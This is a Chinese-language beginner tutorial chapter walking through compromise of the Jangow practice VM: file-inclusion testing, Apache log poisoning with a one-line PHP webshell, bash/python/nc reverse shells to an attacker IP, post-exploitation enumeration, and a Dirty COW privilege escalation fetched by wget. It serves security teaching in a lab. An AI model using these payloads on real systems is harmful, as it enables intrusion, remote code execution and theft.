## 27.2 Web漏洞发现：四处逛逛找漏洞

好了，回顾完了，我们正式开始！

第一步，我们先去网站上逛逛，每个页面都点进去看看，找找有没有什么"不对劲"的地方。

### 27.2.1 访问网站首页

打开浏览器，输入靶机IP：
```
http://192.168.xx.xx
```

看看首页长什么样。

> 🤔 **看首页看什么？**
>
> 看首页不是看热闹，而是要有目的地看：
> - 网站是做什么的？
> - 有什么功能模块？
> - 有没有搜索框？
> - 有没有登录框？
> - 有没有上传文件的地方？
> - URL是什么样的？（是静态的.html还是动态的.php？）
> - 有没有可以输入的地方？

这些都是我们要关注的点。因为**有输入的地方，就可能有漏洞**。

打个比方：
- 你家的门、窗户、排气扇……这些都是"和外界交互的地方"，也就是小偷可能进来的地方。
- 网站也是一样，搜索框、登录框、上传点、URL参数……这些都是"输入点"，也就是可能有漏洞的地方。

### 27.2.2 点点各个链接，看看URL

看完首页，我们开始点链接，看看网站有哪些页面，每个页面的URL是什么样的。

比如你可能会看到这样的URL：
```
http://192.168.xx.xx/site/index.php?page=home
http://192.168.xx.xx/site/index.php?page=about
http://192.168.xx.xx/site/index.php?page=contact
```

哎！这个URL有点意思啊！🤔

你发现了吗？URL里有个参数 `page`，它的值是 `home`、`about`、`contact` 这些文件名。

这说明什么呢？说明这个网站可能是用 `page` 参数来"包含"不同的页面文件的。

用大白话讲：
- 网站的主页面是 `index.php`
- 你想看哪个页面，就通过 `page` 参数告诉它
- 比如 `page=home`，它就把 `home.php` 这个文件包含进来显示
- `page=about`，就把 `about.php` 包含进来

这就像你在餐厅点菜——你跟服务员说"我要宫保鸡丁"，厨师就给你上宫保鸡丁；你说"我要鱼香肉丝"，厨师就给你上鱼香肉丝。

但是！如果这个"点菜"的功能没做好，那就出大事了！

### 27.2.3 测试文件包含漏洞

既然URL里有 `?page=xxx` 这种形式，那我们就要怀疑：**会不会有文件包含漏洞？**

什么是文件包含漏洞呢？

用大白话讲：
- 正常情况下，你点 `page=home`，它就给你看 `home.php` 这个页面
- 但是如果程序员没做过滤，你让它包含什么文件它就包含什么
- 那你是不是可以让它包含一些"不该看的文件"？

比如系统的密码文件 `/etc/passwd`？

> 🤔 **/etc/passwd 是什么？**
>
> 在Linux系统里，`/etc/passwd` 是一个存储用户账户信息的文件。所有用户（包括root）的信息都存在这里。
>
> 虽然现在密码不在这里存了（存在/etc/shadow里），但能读到这个文件，也说明我们能读系统文件了，这是个大漏洞！

那怎么测试呢？很简单，我们把URL改成这样：

```
http://192.168.xx.xx/site/index.php?page=../../../../etc/passwd
```

> 🔍 **解释一下：**
>
> `../` 是什么意思？在Linux里，`../` 表示"上一级目录"。
>
> 为什么要写好几个 `../` 呢？因为我们不知道当前 `index.php` 在第几层目录，所以我们多写几个，一直退到根目录，然后再去找 `/etc/passwd`。
>
> 这就像你在5楼，要去地下1楼，你得往下走好几层楼才能到。

好，我们来试试！在浏览器里输入这个URL，回车。

**结果会怎么样呢？**

如果成功了，你会看到类似这样的内容：
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
jangow:x:1000:1000:jangow,,,:/home/jangow:/bin/bash
...
```

哇！真的读到了！🎉

这说明什么？说明**这个网站存在文件包含漏洞！**

> 🤔 **读到/etc/passwd意味着什么？**
>
> 这意味着：
> 1. 我们可以读取服务器上的任意文件（只要权限够）
> 2. 这个网站的过滤做得非常差
> 3. 我们离拿到Shell不远了！
>
> 就像你去别人家，本来只能在客厅坐坐，结果你发现你能随便开别人家的抽屉、翻别人家的柜子——那你离拿到人家的钥匙还远吗？

### 27.2.4 文件包含漏洞能做什么？

可能有小伙伴要问了："不就是能读个文件吗？有什么大不了的？"

哎，这你就小看文件包含漏洞了！

文件包含漏洞的威力可大了，它不只能读文件，**如果我们能"控制"某个文件的内容，我们就能执行代码！**

什么意思呢？

用大白话讲：
- 现在我们能让服务器"包含"任意文件
- 但是这些文件里是什么内容，我们说了不算
- 那如果我们能想办法，把"恶意代码"写到服务器的某个文件里
- 然后再用文件包含去包含那个文件
- 那我们的恶意代码不就执行了吗？

这就像：
- 你能让老板看任何文件（文件包含）
- 但是文件内容你说了不算
- 那如果你能偷偷把一张小纸条塞进某个文件里
- 然后让老板去看那个文件
- 老板不就看到你的小纸条了吗？

思路有了！那问题来了：**我们怎么把代码写到服务器的文件里呢？**

别着急，方法多着呢！我们一个一个来。

## 27.3 Getshell第一种方法：文件包含 + 日志注入

第一个方法，也是非常经典的一个方法：**日志注入**。

### 27.3.1 日志注入是什么？

先给大家讲讲什么是日志注入。

首先，什么是**日志**？

网站的服务器（比如Apache）会记录每一个访问请求，存在日志文件里。比如谁访问了、什么时候访问的、访问了什么页面、用的什么浏览器……这些都会记下来。

这就像小区门口的保安，会记下来谁进了小区、几点进的、来找谁……清清楚楚。

那什么是**日志注入**呢？

简单说就是：
1. 我们故意在访问网站的时候，把"恶意代码"藏在某个地方（比如User-Agent里）
2. 服务器的日志会把我们的访问记录下来，包括我们的恶意代码
3. 然后我们用文件包含漏洞，去包含这个日志文件
4. 这样我们的恶意代码就被执行了！

就像：
- 你给保安递了一张纸条，纸条上写着"把这张纸条交给领导"
- 保安把纸条夹在记录本里（日志记录）
- 然后你想办法让领导去看保安的记录本（文件包含）
- 领导看到了纸条，就按纸条上说的做了（代码执行）

是不是很巧妙？😏

### 27.3.2 具体步骤讲解

好了，原理讲完了，我们来实际操作一下。

整个过程分为这几步：

1. **找到日志文件的路径** → 知道日志存在哪儿
2. **往日志里注入PHP代码** → 把"小纸条"塞进去
3. **用文件包含包含日志文件** → 让"领导看记录本"
4. **执行命令** → 成功拿到WebShell

我们一步一步来。

#### 第一步：找日志文件路径

首先，我们得知道Apache的日志文件存在哪儿。

在Ubuntu系统里，Apache的默认日志路径是：
```
/var/log/apache2/access.log    → 访问日志
/var/log/apache2/error.log     → 错误日志
```

这是默认路径，一般来说都是这个位置。

> 🤔 **怎么确认是不是这个路径？**
>
> 我们可以用文件包含漏洞去试试啊！
>
> 直接在浏览器里访问：
> ```
> http://192.168.xx.xx/site/index.php?page=/var/log/apache2/access.log
> ```
>
> 如果能看到日志内容，说明路径是对的。
>
> 如果看不到，可能路径不对，或者权限不够。那我们就再试试别的路径。

好，我们来试试。访问这个URL，看看能不能看到日志。

如果成功的话，你会看到一堆类似这样的内容：
```
192.168.xx.xx - - [25/Jun/2026:10:00:00 +0000] "GET /site/ HTTP/1.1" 200 1234 "-" "Mozilla/5.0 ..."
192.168.xx.xx - - [25/Jun/2026:10:00:01 +0000] "GET /site/index.php?page=home HTTP/1.1" 200 567 "-" "Mozilla/5.0 ..."
...
```

哇！真的能看到日志！太好了，第一步成功！✅

#### 第二步：往日志里注入PHP代码

现在我们能读日志了，接下来就是——**往日志里写PHP代码**。

写在哪儿呢？注意看日志里的每一行，最后面有一串 `"Mozilla/5.0 ..."` 的东西，这个叫 **User-Agent**，也就是"用户代理"，告诉服务器你用的是什么浏览器。

这个User-Agent是我们可以控制的！我们可以把它改成任何我们想要的内容。

那我们把它改成PHP代码行不行？当然可以！

我们想写什么代码呢？我们想要一个最简单的WebShell，也就是能通过URL参数执行系统命令的代码。

这种一句话木马长这样：
```php
<?php system($_GET['cmd']); ?>
```

> 🔍 **解释一下这段代码：**
>
> - `<?php ... ?>` → PHP的标签，告诉服务器这中间是PHP代码
> - `system()` → PHP的函数，用来执行系统命令
> - `$_GET['cmd']` → 获取URL参数里 `cmd` 的值
> - 合起来的意思就是：执行URL参数 `cmd` 里的命令

就这么简单！一句话，就能执行系统命令了。

那怎么把User-Agent改成这个呢？

有好几种方法：
- 用Burp Suite抓包改（推荐，最直观）
- 用curl命令改
- 用浏览器插件改

我们这里用**Burp Suite**来演示，因为它是渗透测试的必备工具，大家早晚都要学会用的。

> 💡 **还不会用Burp Suite？**
>
> 没关系，很简单的。简单说Burp Suite就是一个"抓包工具"，能拦截浏览器和服务器之间的通信，然后你可以修改请求内容再发出去。
>
> 配置方法也很简单：
> 1. 打开Burp Suite
> 2. 浏览器设置代理，指向Burp（一般是127.0.0.1:8080）
> 3. 开启Burp的拦截功能（Intercept is on）
> 4. 浏览器访问网站，Burp就会拦住请求
> 5. 你改完内容，点Forward放行

好，假设你已经配置好Burp了，我们来操作：

1. 打开Burp Suite，确保Intercept是开着的
2. 浏览器设置好代理
3. 在浏览器里访问一下网站（随便哪个页面都行）
4. Burp会拦住这个请求
5. 在请求头里找到 `User-Agent:` 这一行
6. 把它的值改成我们的PHP代码：`<?php system($_GET['cmd']); ?>`
7. 点Forward，把这个请求发出去

这样，服务器的日志里就会记录下我们这个"特殊"的User-Agent了！

> ⚠️ **注意：**
>
> 改的时候要小心，别把其他东西改坏了。User-Agent那一行，把冒号后面的内容都删掉，换成我们的PHP代码就行。
>
> 还有，PHP代码里的特殊字符不用担心，日志会原封不动地记下来的。

#### 第三步：包含日志文件，执行命令

好了，我们已经把PHP代码"注入"到日志文件里了。

接下来，我们用文件包含漏洞，去包含这个日志文件，然后传个 `cmd` 参数试试。

URL这样写：
```
http://192.168.xx.xx/site/index.php?page=/var/log/apache2/access.log&cmd=whoami
```

> 🔍 **解释一下：**
>
> - `page=/var/log/apache2/access.log` → 包含日志文件
> - `&cmd=whoami` → 给cmd参数传值，让它执行 `whoami` 命令
>
> `whoami` 是什么命令？就是"我是谁"的意思，执行这个命令会显示当前用户的用户名。

好，我们来访问这个URL试试！

**注意：** 因为日志文件里有很多正常的访问记录，所以页面上会显示一大堆乱七八糟的东西。别慌，慢慢找，在一堆日志中间，你会看到命令执行的结果！

如果你看到类似这样的内容：
```
www-data
```

或者在一大堆HTML源码中间藏着 `www-data` 这几个字——**恭喜你！成功了！🎉**

这说明什么？说明我们的代码执行了！`whoami` 命令返回了 `www-data`，这是Apache的默认用户。

> 🤔 **为什么结果在一大堆乱七八糟的东西中间？**
>
> 因为日志文件里不只有我们注入的那一行，还有很多其他正常的访问记录。当我们包含整个日志文件的时候，所有内容都会被"执行"一遍。
>
> 正常的日志内容就是普通的文字，会直接显示出来；而我们注入的那一行PHP代码，会被执行，执行结果也会显示出来。
>
> 所以你需要在一堆内容里找命令执行的结果。用Ctrl+F搜索一下会更快。

#### 第四步：试试其他命令

既然 `whoami` 能执行，那其他命令肯定也能执行！

我们来试试几个常用的：

看看当前目录：
```
?page=/var/log/apache2/access.log&cmd=pwd
```

看看当前目录有什么文件：
```
?page=/var/log/apache2/access.log&cmd=ls
```

看看有哪些用户：
```
?page=/var/log/apache2/access.log&cmd=cat /etc/passwd
```

都能执行！太棒了！

现在我们就有了一个**WebShell**了！虽然简陋了点，但好歹能执行命令了，不是吗？

> 🎉 **里程碑时刻！**
>
> 恭喜你！你已经成功拿到了这个靶机的WebShell！
>
> 这是你第一个完整靶机的第一步，值得纪念！
>
> 不过别骄傲，这才刚刚开始呢。我们还有很长的路要走——反弹Shell、提权、拿flag……

### 27.3.5 日志注入的原理总结

好了，第一种方法讲完了，我们来总结一下日志注入的原理，帮助大家理解：

```
我们的请求（带恶意User-Agent）
    ↓
服务器收到请求，把请求信息（包括User-Agent）写入日志文件
    ↓
我们用文件包含漏洞，让服务器去"包含"这个日志文件
    ↓
服务器把日志文件当PHP代码执行
    ↓
我们注入的恶意代码被执行 → 拿到WebShell
```

是不是很巧妙？利用了服务器自己的功能，把自己给"坑"了。😏

## 27.4 Getshell其他可能的方法

除了日志注入，还有没有其他拿Shell的方法呢？当然有！

### 27.4.1 找找有没有上传点

第一个思路：找找网站有没有上传文件的功能。

如果网站有上传功能，那我们能不能上传一个PHP的一句话木马？上传成功了，再访问那个文件，不就拿到Shell了吗？

这是最直接的方法。

但是Jangow这个靶机……好像没有明显的上传点。至少前台没有。后台的话，我们还没进去呢。

所以这个方法暂时行不通。

> 💡 **思路要开阔：**
>
> 虽然这个靶机没有上传点，但以后你打其他靶机的时候，一定要记得找找上传功能。文件上传漏洞是拿Shell最快的方法之一。

### 27.4.2 找找有没有命令执行的点

第二个思路：找找网站有没有可以直接执行命令的地方。

比如有些网站会有"ping一下"、"traceroute"这种功能，让你输入IP，然后服务器去ping。如果没做好过滤，就可能存在命令执行漏洞。

怎么找呢？就是到处看，看有没有输入框，输入点的地方都试试。

Jangow这个靶机，其实在某个地方有一个可以执行命令的点……不过我们还是先按文件包含的方法往下走，那个方法就留给大家自己去发现吧。😏

### 27.4.3 看看WordPress能不能利用

上一章我们发现网站有 `/wordpress/` 目录，是一个WordPress博客。

那WordPress能不能利用呢？当然可以试试！

比如：
- 扫一下WordPress有哪些插件，插件有没有漏洞
- 试试爆破WordPress后台密码
- 看看默认用户名admin能不能登录

不过WordPress的利用相对麻烦一点，而且我们已经有文件包含了，就不绕远路了。

> 💡 **给大家的建议：**
>
> 打靶机的时候，思路要开阔，不要死磕一个点。一个方法行不通，就试试另一个。
>
> 条条大路通罗马，不一定非要走哪条路。只要能拿到Shell，就是好方法！

## 27.5 反弹Shell：让Shell更好用

好了，我们已经有WebShell了，能执行命令了。

但是……这个WebShell也太难用了吧！😫

- 每次执行命令都要在URL里改，太麻烦
- 命令的结果混在一堆日志里，不好找
- 不能执行交互式命令（比如需要输入密码的）
- 不稳定，容易断

就像你用一个又旧又卡的老年机打电话，听不清、信号差、还容易断——太难受了！

那怎么办呢？我们需要一个**更好用的Shell**，一个**交互式的Shell**。

这时候，**反弹Shell**就登场了！

### 27.5.1 什么是反弹Shell？

先给大家解释一下什么是反弹Shell。

用大白话讲：
- 现在的情况是：我们通过浏览器给靶机发命令，靶机执行完把结果返回给我们。这叫**正向连接**——我们主动连靶机。
- 而**反弹Shell**呢？反过来了：我们先在自己的电脑上"等着"，然后让靶机**主动来连我们**，连接成功后，我们就获得了一个可以交互的Shell。

可能有点绕，我给大家举个生活中的例子：

**例子：送外卖 🍔**

- **正向连接**：就像你去餐厅吃饭。你主动去餐厅（连接服务器），点完餐（发命令），餐厅给你上菜（返回结果）。
- **反弹Shell**：就像点外卖。你在家等着（监听端口），让外卖员把餐送到你家来（靶机主动连接你）。

为什么叫"反弹"呢？因为方向反过来了——正常都是客户端连服务器，现在是服务器（靶机）连客户端（我们的攻击机），所以叫"反弹"。

### 27.5.2 为什么要用反弹Shell？

可能有小伙伴要问了："好好的正向不用，干嘛要反弹呢？"

问得好！用反弹Shell主要有这几个原因：

**1. 方便交互**
> 反弹Shell是交互式的，你可以像用本地终端一样用，敲什么命令就执行什么命令，体验好多了。

**2. 绕过防火墙**
> 很多时候，服务器有防火墙，不让外面的人连进去。但是服务器主动连外面，防火墙一般管得比较松。
>
> 就像小区保安不让陌生人进小区，但小区里的人出去，保安一般不管。

**3. 更稳定**
> 反弹Shell一般用TCP连接，比在URL里执行命令稳定多了。

**4. 功能更强大**
> 有了交互式Shell，你才能执行一些需要交互的命令，比如su、sudo、vim这些。

总之一句话：**反弹Shell比WebShell好用一万倍！**

### 27.5.3 反弹Shell的原理

反弹Shell的原理很简单，一共三步：

```
1. 攻击机（Kali）开启监听，等着别人来连
       ↓
2. 靶机执行反弹命令，主动连接攻击机
       ↓
3. 连接成功，攻击机获得靶机的Shell
```

就这么简单！

### 27.5.4 具体操作步骤

好了，原理讲完了，我们来实际操作一下。

#### 第一步：在Kali上开启监听

首先，我们要在Kali Linux上开启一个监听端口，等着靶机来连。

用什么工具呢？**netcat**，简称nc。这是一个网络工具中的瑞士军刀，功能非常强大。

开启监听的命令：
```bash
nc -lvnp 4444
```

> 🔍 **参数解释：**
>
> - `-l` → listen，监听模式
> - `-v` → verbose，显示详细信息
> - `-n` → 不用域名解析，直接用IP，速度更快
> - `-p 4444` → 指定监听的端口是4444
>
> 端口可以随便选，只要不被占用就行，比如1234、4444、8888、9999都可以。

执行完这个命令，你会看到类似这样的输出：
```
listening on [any] 4444 ...
```

意思就是：已经在4444端口上监听了，等着别人来连接。

> 💡 **小提示：**
>
> 这个终端窗口不要关！关了监听就没了。让它在那儿开着，等着靶机连过来。

#### 第二步：让靶机执行反弹命令

现在，我们需要让靶机执行一条"反弹Shell"的命令，让它主动来连我们的Kali。

反弹Shell的命令有很多种，什么bash反弹、python反弹、php反弹、nc反弹……我们一个一个来试。

首先，你需要知道你的Kali Linux的IP地址是什么。怎么看呢？在Kali里打开另一个终端，输入：
```bash
ip a
```
或者
```bash
ifconfig
```

找到你的IP地址，比如是 `192.168.12.100`。

> ⚠️ **注意：**
>
> 一定要搞对IP地址！是你的Kali的IP，不是靶机的IP，也不是你真机的IP。搞反了可就连不上了。

好，现在我们有了：
- 攻击机IP：192.168.12.100（你自己的Kali IP）
- 监听端口：4444

接下来，我们让靶机执行反弹命令。在哪里执行呢？当然是用我们刚才拿到的WebShell啊！

在浏览器里，通过URL的cmd参数来执行。

**第一种：bash反弹**

这是最经典的反弹方式：
```bash
bash -i >& /dev/tcp/192.168.12.100/4444 0>&1
```

> 🔍 **这段代码是什么意思？**
>
> 简单说就是：把bash的输入输出都重定向到我们攻击机的4444端口上。
>
> 具体解释的话，涉及到Linux的重定向、文件描述符这些概念，新手暂时不用深究，知道这是反弹Shell的命令就行了。
>
> 以后见多了，自然就懂了。

那我们把这段命令URL编码一下，放到cmd参数里。

完整的URL大概是这样：
```
http://192.168.xx.xx/site/index.php?page=/var/log/apache2/access.log&cmd=bash -i >& /dev/tcp/192.168.12.100/4444 0>&1
```

等等，不对！URL里有特殊字符（比如&、>这些），直接传会出问题的。我们需要把命令URL编码一下。

或者，我们可以换一种方式，用python来反弹，可能更稳定。

**第二种：python反弹**

很多Linux系统都自带python，所以用python反弹成功率很高。

命令是这样的：
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.12.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

这段代码有点长，但是没关系，复制粘贴就行。

> 💡 **小技巧：**
>
> 如果python不行，就试试python3：
> ```python
> python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.12.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
> ```

**第三种：nc反弹**

如果靶机上有nc（netcat），也可以用nc反弹。

命令是这样的：
```bash
nc -e /bin/sh 192.168.12.100 4444
```

不过需要注意，不是所有版本的nc都支持 `-e` 参数。有些版本的nc没有这个功能。

> 💡 **给新手的建议：**
>
> 反弹Shell的方法有很多种，这个不行就试那个，总有一个能成功。
>
> 常见的优先级：python > bash > nc > php
>
> 多试几种，别灰心！

#### 第三步：连接成功！

好了，假设我们执行了反弹命令，然后赶紧切回我们Kali的nc监听窗口看看。

如果你看到类似这样的内容：
```
connect to [192.168.12.100] from (UNKNOWN) [192.168.xx.xx] 12345
```

然后下面有个 `$` 符号在闪——**恭喜你！反弹成功了！🎉🎉🎉**

太不容易了！我们终于拿到了一个交互式的Shell！

现在你可以在这个窗口里敲命令了，就像你直接在靶机上操作一样。

试试：
```bash
whoami
```
看看是不是返回 `www-data`？

再试试：
```bash
pwd
```
看看当前在哪个目录？

再试试：
```bash
ls
```
看看有什么文件？

是不是好用多了？😎

> 🎊 **又一个里程碑！**
>
> 恭喜你！你已经成功拿到了交互式Shell！
>
> 现在你已经"进入"靶机了，虽然只是个普通用户（www-data），但总比在浏览器里敲命令强多了。
>
> 接下来，我们要做的就是：收集更多信息，然后想办法提权，拿到root权限！

### 27.5.5 升级一下Shell（可选）

拿到Shell之后，你可能会发现，这个Shell还是有点难用：
- 没有命令补全（按Tab没反应）
- 按Ctrl+C会直接把Shell干掉
- 没有历史记录（按上键没反应）
- 用vim的时候排版乱

没关系，我们可以升级一下Shell，让它变得更好用。

**升级方法：**

用python升级一下：
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

或者python3：
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

执行完之后，你会发现Shell好用了一点，至少有命令提示符了。

还想要更好的体验？可以再做一些配置，不过对于新手来说，现在这样已经够用了。以后再慢慢学。

## 27.6 进入系统后的信息收集

好了，我们已经进到靶机里面了，虽然是www-data这个低权限用户。

接下来干什么呢？**继续收集信息！**

没错，又是信息收集。但是这次的信息收集，和上一章的不一样——上一章是从外面收集，这次是从里面收集。

打个比方：
- 上一章的信息收集 → 你在人家房子外面转悠，看看有几个窗户、几个门、有没有防盗网
- 现在的信息收集 → 你已经进到房子里了（虽然只是客厅），你要看看房子里有什么、有几间房、钥匙可能放在哪儿

### 27.6.1 基本信息收集

先来收集一些最基本的信息。

#### 我是谁？

```bash
whoami
id
```

看看当前用户是谁，有哪些权限。

不出意外的话，应该是 `www-data`，这是Apache的默认用户，权限很低。

#### 我在哪？

```bash
pwd
```

看看当前在哪个目录。应该在网站的目录下，比如 `/var/www/html/site/` 之类的。

#### 系统信息

```bash
uname -a
cat /etc/issue
```

看看系统是什么版本，内核版本是多少。这些信息对提权很重要！

比如你可能会看到：
```
Linux jangow 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
```

哦！Ubuntu 16.04，内核版本 4.4.0-31，这个版本有点老啊……

老版本意味着什么？意味着可能有很多已知的内核漏洞可以用来提权！😏

#### 有哪些用户？

```bash
cat /etc/passwd
```

看看系统里有哪些用户。重点关注有bash的用户，也就是可以登录的用户。

你可能会看到有个叫 `jangow` 的用户，这应该是靶机的管理员用户。

### 27.6.2 找用户的flag

好了，基本信息收集得差不多了。我们来找找flag！

一般来说，靶机都会有两个flag：
- 一个是**普通用户的flag**，放在用户的家目录里，比如 `/home/jangow/user.txt` 或者 `/home/jangow/local.txt`
- 一个是**root的flag**，放在 `/root/` 目录下，比如 `/root/root.txt` 或者 `/root/proof.txt`

我们先找普通用户的flag。

先看看/home目录下有什么：
```bash
ls /home/
```

应该能看到 `jangow` 这个用户的家目录。

然后进去看看：
```bash
ls -la /home/jangow/
```

哎？可能我们进不去？因为www-data权限不够？

没关系，我们先试试，看看能不能读。

或者……我们先在网站目录里找找，说不定flag藏在网站里呢？

```bash
ls -la /var/www/
ls -la /var/www/html/
ls -la /var/www/html/site/
```

到处看看，仔细找。

> 💡 **找flag的小技巧：**
>
> 用find命令全局搜索一下：
> ```bash
> find / -name "*flag*" -o -name "*proof*" -o -name "*user*" 2>/dev/null
> ```
>
> 这个命令的意思是：从根目录开始找，文件名包含flag、proof、user的文件。
>
> `2>/dev/null` 的意思是把错误信息丢掉，不然会有一大堆"Permission denied"的报错，看着烦。

用这个命令搜一下，说不定就能直接找到flag的位置。

找到了吗？找到的话，就cat一下看看内容：
```bash
cat /path/to/flag.txt
```

恭喜你！拿到第一个flag了！🎉

（如果没找到也没关系，我们继续往下走，后面肯定能找到的。）

### 27.6.3 提权信息收集

好了，普通用户的flag找到了（或者没找到），接下来我们的目标是——**提权到root！**

提权之前，我们需要收集一些信息，看看有哪些提权的可能路径。

#### 看看内核版本

```bash
uname -a
```

刚才我们看到了，内核版本是 4.4.0-31，这个版本比较老。

老内核 → 可能有内核漏洞 → 可以用来提权！

比如大名鼎鼎的**脏牛漏洞（CVE-2016-5195）**，就可以用在这个版本的内核上。

#### 看看有哪些SUID文件

SUID是什么？简单说就是：有些程序，不管是谁运行它，都能以程序所有者的权限运行。

比如，如果一个程序的所有者是root，而且设置了SUID位，那么普通用户运行这个程序的时候，就会临时获得root权限。

这就像——你是个普通人，但是你拿到了总统的印章，你盖了章的文件就有总统的效力。

那怎么找SUID文件呢？用这个命令：
```bash
find / -perm -u=s -type f 2>/dev/null
```

执行完，会列出所有设置了SUID位的文件。

看看这些文件里，有没有什么可疑的、不常见的。常见的SUID文件比如passwd、su、sudo这些都是正常的。如果有什么奇怪的、不认识的，那就要重点关注了。

#### 看看sudo权限

看看当前用户能不能用sudo：
```bash
sudo -l
```

如果能不用密码就执行某些命令，而且那些命令可以拿来提权，那就赚到了。

不过www-data这个用户，大概率是不能用sudo的。试试无妨嘛。

#### 看看定时任务

看看有没有什么定时任务（crontab）是root执行的，如果有，而且我们能修改那个脚本，那也能提权。

看看：
```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
```

#### 看看配置文件、备份文件

找找有没有配置文件里泄露了密码，比如数据库密码、后台密码什么的。

网站的配置文件一般在网站目录下，比如：
- config.php
- wp-config.php（WordPress的配置文件）
- .env
- settings.php

找到配置文件的话，一定要看看里面有没有密码！

比如WordPress的wp-config.php里，就有数据库的用户名和密码。如果数据库密码和系统用户的密码一样，那我们不就能直接登录了吗？

> 💡 **很多人都有一个坏习惯：所有地方都用同一个密码。**
>
> 数据库密码、系统密码、网站后台密码……全都是一样的。
>
> 所以只要我们拿到一个密码，就可以到处试试，说不定就撞对了。
>
> 这招叫"密码复用"，在真实环境中成功率还挺高的。

#### 看看家目录

如果能进其他用户的家目录，一定要进去看看，说不定能找到什么有用的东西。

比如用户的bash历史记录：
```bash
cat ~/.bash_history
```

或者ssh私钥：
```bash
ls -la ~/.ssh/
```

这些都是宝贝！

### 27.6.4 信息收集的思路

给大家总结一下，拿到Shell之后，信息收集的思路是什么：

1. **基本信息** → 我是谁、我在哪、系统是什么版本
2. **内核版本** → 有没有内核漏洞可以利用
3. **SUID文件** → 有没有可以利用的SUID程序
4. **sudo权限** → 能不能用sudo提权
5. **定时任务** → 有没有可以利用的定时任务
6. **配置文件** → 有没有泄露的密码
7. **其他用户** → 其他用户的目录里有什么

一条一条来，都检查一遍，总能找到提权的方法。

> 🤔 **生活小例子：找钥匙 🔑**
>
> 你进到别人家的客厅了，但是你想去卧室（root权限），卧室门锁着。怎么办？
>
> - 看看客厅有没有备用钥匙（配置文件里的密码）
> - 看看有没有什么工具能撬锁（内核漏洞）
> - 看看门是不是没关紧（SUID漏洞）
> - 看看窗户能不能翻进去（定时任务）
>
> 提权也是一样，多找几个方向，总有一个能行。

## 27.7 提权：从普通用户到root

好了，信息收集得差不多了，我们开始提权！

提权是渗透测试中最关键、最有技术含量的一步，也是最有成就感的一步。

从普通用户到root，就像从一个普通员工变成公司老板——想干什么就能干什么。

### 27.7.1 Jangow的提权思路

Jangow这个靶机，提权的方法不止一种。我们来讲讲最常用的几种思路。

首先，我们回顾一下收集到的信息：
- 系统：Ubuntu 16.04

#### 方法一：内核漏洞提权（脏牛）

内核版本这么老，第一个想到的当然是**脏牛漏洞（Dirty COW，CVE-2016-5195）**！

脏牛漏洞是什么？简单说就是Linux内核的一个内存管理漏洞，利用这个漏洞，普通用户可以修改任意文件，从而提升到root权限。

这个漏洞的名气非常大，几乎所有学提权的人都知道它。

那脏牛漏洞能不能用在Jangow上呢？我们来看看：
- 内核版本 4.4.0-31 → 2016年7月的版本
- 脏牛漏洞是2016年10月披露的
- 所以这个版本的内核是有脏牛漏洞的！

完美！那我们就用脏牛来提权？

等等……先别急。虽然脏牛能用，但我们先看看有没有更简单的方法。毕竟内核漏洞利用有风险，万一把系统搞崩了呢？

我们先看看其他方法，实在不行再用内核漏洞。

#### 方法二：找密码

第二个思路：找找有没有密码可以用。

比如：
- 网站配置文件里的数据库密码
- Wordpress后台密码
- 其他地方泄露的密码

找到密码之后，试试能不能切换到jangow用户，或者直接su到root。

这是最简单的方法，如果能找到密码，那就轻松了。

#### 方法三：SUID提权

第三个思路：看看有没有可以利用的SUID文件。

如果find命令搜出来的SUID文件里，有什么不常见的，那我们就可以研究研究，看看能不能利用它来提权。

好，我们一个一个来试。先从最简单的开始——找密码。

### 27.7.5 备用方案：内核漏洞提权

如果你实在找不到密码，那也没关系，我们还有大招——**内核漏洞提权**。

比如脏牛漏洞。

脏牛漏洞的利用方法，大概是这样的：

1. 下载脏牛的exp（漏洞利用脚本）
2. 编译（如果是C语言的）
3. 运行exp
4. 获得root权限

具体怎么操作呢？

首先，你需要在Kali里下载脏牛的exp，然后想办法传到靶机上。

怎么传呢？可以用python起一个简单的HTTP服务，然后在靶机上用wget下载。

**步骤：**

1. 在Kali里，找一个目录，下载脏牛的exp：
   ```bash
   searchsploit dirty cow
   ```
   或者去网上找一个脏牛的C代码，保存为 `dirty.c`。

2. 在Kali里起一个HTTP服务：
   ```bash
   python -m SimpleHTTPServer 8000
   ```
   （python3的话是 `python3 -m http.server 8000`）

3. 在靶机上，下载这个文件：
   ```bash
   cd /tmp
   wget http://192.168.12.100:8000/dirty.c
   ```
   （IP换成你Kali的IP）

4. 编译：
   ```bash
   gcc -pthread dirty.c -o dirty -lcrypt
   ```

5. 运行：
   ```bash
   ./dirty
   ```

然后等着，过一会儿，exp运行完，你就变成root了！

> ⚠️ **注意：**
>
> 内核漏洞利用有风险，可能会导致系统崩溃（蓝屏、死机）。
>
> 所以这是"备用方案"，能不用就不用，先用其他更安全的方法。
>
> 当然了，打靶机嘛，崩溃了大不了重启快照，无所谓。但在真实环境中，一定要谨慎！

## 27.10 新手常见问题解答

好了，讲完了正式内容，我们来聊聊新手经常遇到的一些问题。

### 27.10.1 反弹Shell不成功怎么办？

反弹Shell不成功是新手最常遇到的问题之一。

别慌，按这个检查清单一条一条查：

1. **IP地址对不对？**
   > 反弹命令里的IP，是你的Kali的IP吗？别写成靶机的IP了！
   >
   > 很多新手都会犯这个错，把IP搞反了。

2. **端口有没有监听？**
   > Kali上的nc -lvnp 4444执行了吗？别光顾着在靶机上执行命令，忘了在Kali上监听了。

3. **能不能通？**
   > 靶机能ping通你的Kali吗？先试试ping一下，看看网络通不通。
   >
   > 如果ping不通，那肯定连不上啊。检查一下网络设置，是不是都在NAT模式。

4. **防火墙？**
   > 你的Kali有没有开防火墙？防火墙可能会把连接挡掉。
   >
